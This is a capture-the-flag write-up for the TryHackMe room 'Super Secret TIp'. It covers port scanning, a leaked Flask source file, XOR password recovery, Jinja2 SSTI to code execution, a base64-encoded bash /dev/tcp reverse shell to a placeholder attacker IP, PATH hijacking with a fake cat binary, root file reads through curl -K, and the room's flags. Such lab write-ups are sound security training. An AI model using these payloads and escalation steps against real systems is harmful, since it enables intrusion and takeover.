# TryHackMe — Super Secret TIp (Medium)

> **Platform:** TryHackMe  
> **Room:** [Super Secret TIp](https://tryhackme.com/room/supersecrettip)  
> **Difficulty:** Medium  
> **Category:** Web Exploitation, Privilege Escalation  
> **Key Techniques:** SSTI (Jinja2), XOR Decryption, PATH Hijacking, curl -K Abuse, Reverse Shell  

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [Source Code Analysis](#source-code-analysis)
4. [XOR Password Decryption](#xor-password-decryption)
5. [SSTI to RCE](#ssti-to-rce)
6. [Reverse Shell as ayham](#reverse-shell-as-ayham)
7. [Lateral Movement: ayham → F30s (PATH Hijacking)](#lateral-movement-ayham--f30s-path-hijacking)
8. [Privilege Escalation: F30s → root (curl -K Abuse)](#privilege-escalation-f30s--root-curl--k-abuse)
9. [Decrypting flag2.txt](#decrypting-flag2txt)
10. [Lessons Learned](#lessons-learned)

---

## Reconnaissance

### Port Scanning

Initial scan of the top 1000 ports only revealed SSH:

```bash
nmap -sC -sV --top-ports 1000 -T4 <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
```

A full port scan revealed a hidden service on a non-standard port:

```bash
nmap -p- -T4 --min-rate=1000 <TARGET_IP>
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
7777/tcp open  cbt
```

Detailed scan of port 7777:

```bash
nmap -sC -sV -p 7777 <TARGET_IP>
```

```
7777/tcp open  cbt?
| Server: Werkzeug/2.3.4 Python/3.11.0
| <meta name="description" content="SSTI is wonderful">
| <meta name="author" content="Ayham Al-Ali">
```

**Key findings:**
- Flask/Werkzeug web application on port 7777
- HTML meta tag explicitly hints at SSTI
- Author: Ayham Al-Ali

**Lesson:** Always scan all 65535 ports (`-p-`). Non-standard ports are common in CTFs and real-world scenarios.

---

## Web Enumeration

### Directory Bruteforce

```bash
gobuster dir -u http://<TARGET_IP>:7777 -w /usr/share/wordlists/dirb/common.txt -t 50
```

```
/cloud    (Status: 200) [Size: 2991]
/debug    (Status: 200) [Size: 1957]
```

### /cloud — File Download Manager

A page titled "Download My Files" with a file listing and a POST form:

```html
<form action="" method="post">
    <input type="radio" name="download" value="my-passwords.txt">
    <input type="radio" name="download" value="secret.txt">
    <input type="radio" name="download" value="templates.py">
    <!-- ... -->
    <input maxlength="6" name="download" placeholder="s">
</form>
```

Most files returned 404, but `source.py` could be downloaded:

```bash
curl -X POST -d "download=source.py" http://<TARGET_IP>:7777/cloud -o source.py
```

### /debug — Admin Debugger

A debug console with two fields: `debug` (placeholder: `1337 * 1337`) and `password`. Method: GET. Password-protected.

---

## Source Code Analysis

The downloaded `source.py` revealed the full Flask application logic:

```python
from flask import *
import hashlib, os
import ip             # custom module — checks IP
import debugpassword  # custom module — XOR encryption
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    # ...
```

### Key Findings from Source Code

1. **Hidden endpoint `/debugresult`** — where SSTI actually occurs via `render_template_string()`
2. **Illegal character filter** — `' & ; %` are blocked, but `" {{ }} _ . ( ) |` are allowed
3. **IP check on `/debugresult`** — only accessible from localhost
4. **XOR hint in comment:** `# I am not very eXperienced with encryptiOns, so heRe you go!` — capital letters spell **X-O-R**
5. **Password** stored as XOR-encrypted value in `supersecrettip.txt`

### SSTI Vulnerability

```python
# TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
template = open('./templates/debugresult.html').read()
return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
```

User input from the `debug` field is directly inserted into the template via string replacement, then rendered with `render_template_string()` — a classic SSTI vulnerability.

---

## XOR Password Decryption

### Retrieving the Encrypted Password

```bash
curl -X POST -d "download=supersecrettip.txt" http://<TARGET_IP>:7777/cloud
```

```
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

### Finding the XOR Key

The comment hinted at XOR encryption. The key was the author's name **"Ayham"** from the HTML meta tag.

```python
python3 -c "
cipher = b' \x00\x00\x00\x00\x25\x1c\x0d\x03\x18\x06\x1e'
key = 'Ayham'
result = ''
for i, b in enumerate(cipher):
    result += chr(b ^ ord(key[i % len(key)]))
print(f'Password: {result}')
"
```

```
Password: AyhamDeebugg
```

### Verification

```bash
curl -s "http://<TARGET_IP>:7777/debug?debug=test&password=AyhamDeebugg" | grep "executed"
```

```html
<h2 class="result">Debug statement executed.</h2>
```

---

## SSTI to RCE

### Two-Step Cookie Attack

The SSTI exploitation requires two steps due to the application architecture:

**Step 1:** Submit the payload on `/debug` to get a session cookie:

```bash
curl -v -G \
  -H "X-Forwarded-For: 127.0.0.1" \
  --data-urlencode 'debug={{7*7}}' \
  --data-urlencode "password=AyhamDeebugg" \
  "http://<TARGET_IP>:7777/debug" 2>&1 | grep "set-cookie" -i
```

**Step 2:** Use the cookie on `/debugresult` with `X-Forwarded-For: 127.0.0.1` to bypass the IP check:

```bash
curl -s "http://<TARGET_IP>:7777/debugresult" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -b "session=<COOKIE>" | grep "result"
```

```html
<span class="result">49</span>
```

SSTI confirmed: `{{7*7}}` = 49.

### Achieving RCE

Using the Jinja2 `cycler` built-in object to reach `os.popen()`:

```
{{cycler.__init__.__globals__.os.popen("id").read()}}
```

Result:

```
uid=1000(ayham) gid=1000(ayham) groups=1000(ayham)
```

### Reading flag1.txt

```
{{cycler.__init__.__globals__.os.popen("cat /home/ayham/flag1.txt").read()}}
```

```
THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}
```

---

## Reverse Shell as ayham

The `&` character is blocked by the filter, so we encode the reverse shell in base64:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64
```

**Listener:**

```bash
nc -lvnp 4444
```

**Payload (via SSTI):**

```
{{cycler.__init__.__globals__.os.popen("echo <BASE64_STRING> | base64 -d | bash").read()}}
```

After obtaining the cookie from `/debug` and hitting `/debugresult`, a reverse shell connects back.

---

## Lateral Movement: ayham → F30s (PATH Hijacking)

### Enumeration

Checking `/etc/crontab` revealed two critical cronjobs:

```
*  *  *  *  *  root  curl -K /home/F30s/site_check
*  *  *  *  *  F30s  bash -lc 'cat /home/F30s/health_check'
```

File permissions in F30s home directory:

```
-rw-r--rw- 1 F30s F30s  807 .profile      # World-writable!
-rw-r----- 1 F30s F30s   38 site_check     # Only readable by F30s
-rw-r--r-- 1 root root   17 health_check
```

### Attack: PATH Hijacking

The F30s cronjob runs `bash -lc` — the `-l` flag means **login shell**, which reads `.profile` and loads the PATH variable.

**Step 1:** Create a fake `cat` binary containing a reverse shell:

```bash
mkdir -p /home/ayham/bin
echo '#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1' > /home/ayham/bin/cat
chmod +x /home/ayham/bin/cat
```

**Step 2:** Overwrite F30s's `.profile` to prepend our directory to PATH:

```bash
echo 'PATH="/home/ayham/bin:$PATH"' > /home/F30s/.profile
```

**Step 3:** Start a listener and wait (~1 minute):

```bash
nc -lvnp 5555
```

**What happens:**
1. Cronjob runs: `bash -lc 'cat /home/F30s/health_check'`
2. `bash -l` reads `/home/F30s/.profile` → sets `PATH="/home/ayham/bin:$PATH"`
3. `cat` command searches PATH → finds `/home/ayham/bin/cat` first
4. Our fake `cat` executes → reverse shell as F30s

```
F30s@target:~$ whoami
F30s
```

---

## Privilege Escalation: F30s → root (curl -K Abuse)

### Understanding the Vector

Root runs `curl -K /home/F30s/site_check` every minute. The `-K` flag tells curl to read configuration from a file. As F30s, we can now edit `site_check`.

The `file://` protocol in curl reads local files. Combined with root privileges, this lets us read any file on the system.

### Reading flag2.txt

```bash
echo 'url = "file:///root/flag2.txt"' > /home/F30s/site_check
echo '--output "/home/F30s/flag2.txt"' >> /home/F30s/site_check
```

After ~1 minute:

```bash
/bin/cat /home/F30s/flag2.txt
```

```
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
```

The flag is XOR-encrypted.

### Reading secret.txt and secret-tip.txt

Using the same curl -K technique to retrieve `/root/secret.txt` and `/secret-tip.txt`:

**secret-tip.txt:**
```
A wise *gpt* once said ...
"Don't forget it's always about root!"
```

**secret.txt:**
```
b'C^_M@__DC\\7,'
```

---

## Decrypting flag2.txt

### Step 1: Decrypt secret.txt with XOR key "root"

```python
python3 -c "
secret = b'C^_M@__DC\x5c7,'
key = b'root'
result = ''
for i, b in enumerate(secret):
    result += chr(b ^ key[i % len(key)])
print('Decrypted key:', result)
"
```

```
Decrypted key: 1109200013XX
```

### Step 2: Bruteforce the Last Two Digits

```python
python3 -c "
flag2 = b'ey}BQB_^[\\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'

for i in range(100):
    key = ('1109200013' + str(i).zfill(2)).encode()
    result = ''
    for j, b in enumerate(flag2):
        result += chr(b ^ key[j % len(key)])
    if 'THM{' in result:
        print(f'Key: 1109200013{str(i).zfill(2)} -> {result}')
"
```

```
Key: 110920001386 -> THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}
```

---

## Flags

| Flag | Value |
|------|-------|
| flag1.txt | `THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}` |
| flag2.txt passphrase | `110920001386` |
| flag2.txt | `THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}` |

---

## Lessons Learned

### Reconnaissance
- **Always perform a full port scan** (`-p-`). Port 7777 was invisible in the default top-1000 scan.
- **Source code analysis > directory bruteforce.** Downloading `source.py` revealed a hidden endpoint (`/debugresult`) that gobuster could never find.

### Exploitation
- **Establish a reverse shell immediately after confirming RCE.** Working through SSTI cookies was slow and error-prone. A proper shell makes everything faster.
- **Base64 encoding bypasses character filters.** When `& ; '` are blocked, encode payloads in base64 and pipe through `base64 -d | bash`.
- **X-Forwarded-For** can bypass IP-based access controls when the application trusts this header.

### Privilege Escalation
- **World-writable files in other users' home directories** are critical findings. The `.profile` with `-rw-r--rw-` permissions enabled PATH hijacking.
- **Cronjobs with `-l` flag** load `.profile`, making PATH hijacking possible.
- **`curl -K` with a user-controlled config file** is equivalent to arbitrary file read/write as the user running curl. Combined with root, this is a full compromise.
- **Never run privileged commands** that read configuration from files controlled by unprivileged users.

### Cryptography
- **XOR encryption is reversible** when you know (or can guess) the key. Look for hints in comments, metadata, and filenames.
- **Partial key recovery + bruteforce** works when only a few bytes are unknown.

---

## Attack Chain Summary

```
Full Port Scan → Port 7777 (Flask/Werkzeug)
    ↓
Gobuster → /cloud, /debug
    ↓
Source Code Leak (source.py) → Found /debugresult, XOR hint, illegal chars filter
    ↓
XOR Decryption (key: "Ayham") → Debug password: AyhamDeebugg
    ↓
SSTI {{7*7}}=49 → RCE via cycler.__init__.__globals__.os.popen()
    ↓
Reverse Shell (base64 bypass) → User: ayham → flag1.txt
    ↓
PATH Hijacking (.profile + fake cat) → User: F30s
    ↓
curl -K Abuse (file:// protocol) → Read /root/flag2.txt as root
    ↓
XOR Decryption (key: "root" → 110920001386) → flag2.txt
```

---

## Tools Used

- **nmap** — port scanning and service detection
- **gobuster** — directory bruteforce
- **curl** — HTTP requests, cookie handling, file downloads
- **python3** — XOR decryption, class index discovery
- **netcat (nc)** — reverse shell listener
- **base64** — payload encoding to bypass character filters
